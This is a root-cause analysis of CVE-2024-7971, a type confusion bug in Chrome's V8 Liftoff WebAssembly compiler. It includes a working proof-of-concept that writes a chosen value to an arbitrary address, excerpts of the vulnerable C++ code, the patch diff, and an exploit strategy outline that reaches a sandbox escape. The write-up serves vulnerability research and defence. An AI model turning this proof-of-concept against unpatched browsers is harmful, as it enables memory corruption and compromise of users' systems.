# CVE-2024-7971: Chrome Type Confusion in V8
* a1loy

## The Basics

**Disclosure or Patch Date:** 21 August 2024

**Product:** Google Chrome

**Advisory:** https://chromereleases.googleblog.com/2024/08/stable-channel-update-for-desktop_21.html

**Affected Versions:** pre 128.0.6613.84

**First Patched Version:** 128.0.6613.84

**Issue/Bug Report:** https://issues.chromium.org/issues/360700873

**Patch CL:** https://chromium-review.googlesource.com/c/v8/v8/+/5797073

**Bug-Introducing CL:** N/A

**Reporter(s):** Microsoft Threat Intelligence Center (MSTIC), Microsoft Security Response Center (MSRC)

## The Code 

**Proof-of-concept:**

```js
// Flags: --liftoff-only
// d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
const builder = new WasmModuleBuilder();

builder.addArray(kWasmI32, true);
builder.addStruct([makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(kWasmI32, true)]);
builder.addStruct([makeField(kWasmF32, true), makeField(wasmRefNullType(0), true), makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(wasmRefNullType(0), true), makeField(wasmRefNullType(0), true)]);
builder.addType(makeSig([wasmRefNullType(2)], []));

let $sig2 =
    builder.addType(makeSig([], [kWasmF32, kWasmF32, kWasmF64, kWasmFuncRef]));
let $sig3 = builder.addType(
    makeSig([wasmRefNullType(2), kWasmF32, kWasmF32, kWasmF64, kWasmFuncRef], []));
    
let wasmDummyFunc = builder.addImport('m', 'dummyFunc', kSig_v_v);
let $globalLoopCounter = builder.addImportedGlobal('m', 'globalLoopCounter', kWasmI32, true);
let $globalLowerAddr = builder.addImportedGlobal('m', 'globalLowerAddr', kWasmF32, true);
let $globalUpperAddr = builder.addImportedGlobal('m', 'globalUpperAddr', kWasmF32, true);
let $globalWriteValue = builder.addImportedGlobal('m', 'globalWriteValue', kWasmF32, true);

builder.addDeclarativeElementSegment([wasmDummyFunc]);

let globalLowerAddr = new WebAssembly.Global({value: 'f32', mutable: true});
let globalUpperAddr = new WebAssembly.Global({value: 'f32', mutable: true});
let globalWriteValue = new WebAssembly.Global({value: 'f32', mutable: true});
let globalLoopCounter = new WebAssembly.Global({value: 'i32', mutable: true});
globalLoopCounter.value = 3; 

let triggerIdx = builder.addFunction(undefined, makeSig([wasmRefNullType(2)], []))
.addBodyWithEnd([
    kExprRefNull, 0x2,
    kExprTry, $sig2,
        ...wasmF32Const(0),
        ...wasmF32Const(0),
        ...wasmF64Const(0),
        kExprRefNull, kFuncRefCode,
    kExprEnd,

    kExprLoop, $sig3,
        kExprGlobalGet, $globalLoopCounter,
        kExprI32Const, 0x1,
        kExprI32Sub,
        kExprGlobalSet, $globalLoopCounter,
        kExprGlobalGet, $globalLoopCounter,
        kExprI32Const, 1, 
        kExprI32LtS,

        kExprIf, kWasmVoid,
            kExprLocalGet, 0,
            kExprGlobalGet, $globalWriteValue,
            kGCPrefix, kExprStructSet, 2, 0, 
            kExprReturn,
        kExprEnd,
        
        kExprDrop, 
        kExprDrop, 
        kExprDrop,
        kExprDrop,
        kExprLocalSet, 0,
        
        kExprI64Const, 0,
        kExprRefNull, 2,
        kExprGlobalGet, $globalUpperAddr, 
        kExprGlobalGet, $globalLowerAddr, 
        ...wasmF64Const(1),
        kExprRefFunc, dummyFunc,
        kExprBr, 0,
    kExprEnd,
    kExprEnd,
]).index;

builder.addFunction('main', makeSig([kWasmF32, kWasmF32, kWasmF32], []))
  .addBodyWithEnd([
    kExprLocalGet, 0,
    kExprGlobalSet, $globalUpperAddr,

    kExprLocalGet, 1,
    kExprGlobalSet, $globalLowerAddr,

    kExprLocalGet, 2,
    kExprGlobalSet, $globalWriteValue,

    kExprRefNull, 0x2,
    kExprCallFunction, triggerIdx,
    kExprEnd, 
]).exportFunc();

function dummyFunc() {};
function intToFloat32(val) {
    let byte_view = new Uint8Array(8);
    let data_view = new DataView(byte_view.buffer);
    data_view.setUint32(0, val, true)
    return data_view.getFloat32(0, true);
}

let instance = builder.instantiate({m:{globalLoopCounter, globalLowerAddr, globalUpperAddr, globalWriteValue, dummyFunc}});
// writing value 0x12345678 to address 0xdeadbeef'13371337 + 7
instance.exports.main(intToFloat32(0xdeadbeef), intToFloat32(0x13371337), intToFloat32(0x12345678));
```

**Exploit sample:** N/A

**Did you have access to the exploit sample when doing the analysis?** No

## The Vulnerability

**Bug class:** Type Confusion

**Vulnerability details:** 

During WASM module compilation Liftoff compiler is used to generate native code for WASM functions.
Liftoff code generation procedure maintains a state ([code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/liftoff-assembler.h;l=111;drc=3b0638107e9b1466362547e6478a54f9c66994b5), [description](https://v8.dev/blog/liftoff#code-generation-in-liftoff)) which describes current set of variables presented (variables could be presented on stack or registers) and their types. 
Each basic block (e.g. function or some instructions) might use current state, create a new state or "back merge" previous state. 

There are instructions "Loop" and "Br" which are in combination with proper state "layout" could be used to create a new state [1], update it [2], merge it [3] and reuse it inside of a loop [4] in a way that variable which has been stored in register will be changed without update of its type.    

Consider following snippet from [regress test](https://source.chromium.org/chromium/chromium/src/+/main:v8/test/mjsunit/regress/wasm/regress-360700873.js):

```js

let $sig2 =
    builder.addType(makeSig([], [kWasmF32, kWasmF32, kWasmF64, kWasmFuncRef]));

let $sig3 = builder.addType(
    makeSig([kWasmExternRef, kWasmF32, kWasmF32, kWasmF64, kWasmFuncRef], []));
// $sig3 describes part of the the state, which will hold info about variables with types
// extern_ref, float32, float32, float64, func_ref


// ...
    kExprRefNull, kExternRefCode,
    kExprTry, $sig2, // creating a state which will later used in loop
      ...wasmF32Const(0),
      ...wasmF32Const(0),
      ...wasmF64Const(0),
      kExprRefNull, kFuncRefCode,
    kExprEnd,

    kExprLoop, $sig3, // [1], state inside of a loop is [f64:s0x28, ref null:rax, f32:s0x34, f32:s0x38, f64:s0x40, ref null:s0x48]

      kExprCallFunction, a0, // [4] during loop execution there is a variable in rax, but its content will be modified after first iteration
    
      kExprDrop, // [2] instructions below modify state 
      kExprDrop,    
      kExprDrop,
      kExprDrop,
      kExprI64Const, 0,
      kExprRefNull, kExternRefCode, 
      ...wasmF32Const(30),
      ...wasmF32Const(50),
      kExprGlobalGet, $global0,
      kExprRefFunc, a0,
      kExprBr, 0, // [3] call to BrImpl which merges state

```

Vulnerable flow in C++ implementation of Loop instruction, which basically creates new state with the ``` PrepareLoopArgs ``` call.

```c++
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/liftoff-compiler.cc
// ...
void Loop(FullDecoder* decoder, Control* loop) {
    // Before entering a loop, spill all locals to the stack, in order to free
    // the cache registers, and to avoid unnecessarily reloading stack values
    // into registers at branches.
    // TODO(clemensb): Come up with a better strategy here, involving
    // pre-analysis of the function.
    __ SpillLocals();

    __ PrepareLoopArgs(loop->start_merge.arity);

    // Loop labels bind at the beginning of the block.
    __ bind(loop->label.get());

    // Save the current cache state for the merge when jumping to this loop.
    loop->label_state.Split(*__ cache_state());

    PushControl(loop);
// ..
```

```c++
//  https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/liftoff-assembler.cc
// ...
void LiftoffAssembler::PrepareLoopArgs(int num) {
  for (int i = 0; i < num; ++i) {
    VarState& slot = cache_state_.stack_state.end()[-1 - i];
    if (slot.is_stack()) continue;
    RegClass rc = reg_class_for(slot.kind());
    if (slot.is_reg()) {
      if (cache_state_.get_use_count(slot.reg()) > 1) {
        // If the register is used more than once, we cannot use it for the
        // merge. Move it to an unused register instead.
        LiftoffRegList pinned;
        pinned.set(slot.reg());
        LiftoffRegister dst_reg = GetUnusedRegister(rc, pinned);
        Move(dst_reg, slot.reg(), slot.kind());
        cache_state_.dec_used(slot.reg());
        cache_state_.inc_used(dst_reg);
        slot.MakeRegister(dst_reg);
      }
      continue;
    }
    LiftoffRegister reg = GetUnusedRegister(rc, {});
    LoadConstant(reg, slot.constant());
    slot.MakeRegister(reg);
    cache_state_.inc_used(reg);
  }
}
// ...

void LiftoffAssembler::SpillLocals() {
  for (uint32_t i = 0; i < num_locals_; ++i) {
    Spill(&cache_state_.stack_state[i]);
  }
}


//...
```

Vulnerable flow in C++ implementation of Br instructions could be described as ``` BrImpl -> MergeStackWith -> Transfer -> TransferToStack ```

```c++
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/liftoff-compiler.cc
  void BrImpl(FullDecoder* decoder, Control* target) {
    // ..
    if (target->br_merge()->reached) {
      __ MergeStackWith(target->label_state, target->br_merge()->arity,
                        target->is_loop() ? LiftoffAssembler::kBackwardJump
                                          : LiftoffAssembler::kForwardJump);
    /..
```

BrImpl call MergeStackWith method to merge current state with some target state.

```c++
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/liftoff-assembler.cc
// ..
void LiftoffAssembler::MergeStackWith(CacheState& target, uint32_t arity,
                                      JumpDirection jump_direction) {
  uint32_t stack_height = cache_state_.stack_height();
  uint32_t target_stack_height = target.stack_height();
  // ...
  uint32_t stack_base = stack_height - arity;
  uint32_t target_stack_base = target_stack_height - arity;
  ParallelMove parallel_move{this};
  for (uint32_t i = 0; i < target_stack_base; ++i) {
    parallel_move.Transfer(target.stack_state[i], cache_state_.stack_state[i]);

  // ...
```

For each of element in state ``` Transfer ``` method called.

```c++
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/parallel-move.h
// ...
  V8_INLINE void Transfer(const VarState& dst, const VarState& src) {
    DCHECK(CompatibleStackSlotTypes(dst.kind(), src.kind()));
    if (dst.is_stack()) {
      if (V8_UNLIKELY(!(src.is_stack() && src.offset() == dst.offset()))) {
        TransferToStack(dst.offset(), src);
// ...

```

``` MoveStackValue ``` generates actual native code, which copies data.

```c++
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/parallel-move.cc
// ...

void ParallelMove::TransferToStack(int dst_offset, const VarState& src) {
  switch (src.loc()) {
    case VarState::kStack:
      if (src.offset() != dst_offset) {
        asm_->MoveStackValue(dst_offset, src.offset(), src.kind());
      }
      break;
    // ...

```

Resulting native code will have several ``` mov ``` instructions which will update register containing variable of different type without any type or usage check leading to type confusion.

**Patch analysis:**

Patch https://chromium-review.googlesource.com/c/v8/v8/+/5797073 modifies Loop instruction codegen logic by "spilling" all variables to stack instead of register preventing confusion of register variables:

```diff
--- a/src/wasm/baseline/liftoff-assembler.cc
+++ b/src/wasm/baseline/liftoff-assembler.cc
@@ -424,29 +424,10 @@
   cache_state_.stack_state.pop_back();
 }
 
-void LiftoffAssembler::PrepareLoopArgs(int num) {
-  for (int i = 0; i < num; ++i) {
-    VarState& slot = cache_state_.stack_state.end()[-1 - i];
-    if (slot.is_stack()) continue;
-    RegClass rc = reg_class_for(slot.kind());
-    if (slot.is_reg()) {
-      if (cache_state_.get_use_count(slot.reg()) > 1) {
-        // If the register is used more than once, we cannot use it for the
-        // merge. Move it to an unused register instead.
-        LiftoffRegList pinned;
-        pinned.set(slot.reg());
-        LiftoffRegister dst_reg = GetUnusedRegister(rc, pinned);
-        Move(dst_reg, slot.reg(), slot.kind());
-        cache_state_.dec_used(slot.reg());
-        cache_state_.inc_used(dst_reg);
-        slot.MakeRegister(dst_reg);
-      }
-      continue;
-    }
-    LiftoffRegister reg = GetUnusedRegister(rc, {});
-    LoadConstant(reg, slot.constant());
-    slot.MakeRegister(reg);
-    cache_state_.inc_used(reg);
+void LiftoffAssembler::SpillLoopArgs(int num) {
+  for (VarState& slot :
+       base::VectorOf(cache_state_.stack_state.end() - num, num)) {
+    Spill(&slot);
   }
 }
 
@@ -664,14 +645,14 @@
 }
 
 void LiftoffAssembler::SpillLocals() {
-  for (uint32_t i = 0; i < num_locals_; ++i) {
-    Spill(&cache_state_.stack_state[i]);
+  for (VarState& local_slot :
+       base::VectorOf(cache_state_.stack_state.data(), num_locals_)) {
+    Spill(&local_slot);
   }
 }
 
 void LiftoffAssembler::SpillAllRegisters() {
-  for (uint32_t i = 0, e = cache_state_.stack_height(); i < e; ++i) {
-    auto& slot = cache_state_.stack_state[i];
+  for (VarState& slot : cache_state_.stack_state) {
     if (!slot.is_reg()) continue;
     Spill(slot.offset(), slot.reg(), slot.kind());
     slot.MakeStack();

```

**Thoughts on how this vuln might have been found _(fuzzing, code auditing, variant analysis, etc.)_:**

It might be possible that issue has been found by manual code auditing of Liftoff compiler implementation, but its more likely that it was found by fuzzing even despite the fact that correct sequence of wasm instructions does not trigger any memory corruptions (but it is possible to trigger dcheck assertion with proper signature types and constant).

**(Historical/present/future) context of bug:** 

The interesting part of this bug is a fact that it is a bug in Liftoff - one of codegen compiler, which are used to compile wasm modules and there are not so many public cases of security issues in Liftoff, because of relatively small size of Liftoff codebase and its simplicity. 

## The Exploit

(The terms *exploit primitive*, *exploit strategy*, *exploit technique*, and *exploit flow* are [defined here](https://googleprojectzero.blogspot.com/2020/06/a-survey-of-recent-ios-kernel-exploits.html).)

**Exploit strategy (or strategies):** 

Generic exploitation strategy could be similar to any other V8 Type Confusions:

1) Achieve Type Confusion for an object
2) Achieve arbitary read-write (ARW) primitive inside of V8 sandbox
3) Bypass V8 sandbox
4) Corrupt an object/structure outside of V8 sandbox with the purpose to achieve ARW primitive in renderer process
5) Perform sandbox escape to compromise system

But in this case V8 sandbox bypass are not necessary due to nature of bug.

**Exploit flow:** 

**Known cases of the same exploit flow:**

**Part of an exploit chain?**

Yes

## The Next Steps

### Variant analysis

**Areas/approach for variant analysis (and why):**

Looking for similar patterns related to loops or any other block which could change object types dynamically inside of a block might be working strategy to find such issues in different optimizers/engines.

**Found variants:**

* https://issues.chromium.org/issues/383356864 (originally founded independently of this analysis)

### Structural improvements

What are structural improvements such as ways to kill the bug class, prevent the introduction of this vulnerability, mitigate the exploit flow, make this type of vulnerability harder to exploit, etc.?

**Ideas to kill the bug class:**

**Ideas to mitigate the exploit flow:**

**Other potential improvements:**

### 0-day detection methods

What are potential detection methods for similar 0-days? Meaning are there any ideas of how this exploit or similar exploits could be detected **as a 0-day**?

## Other References 

* https://github.com/mistymntncop/CVE-2024-7971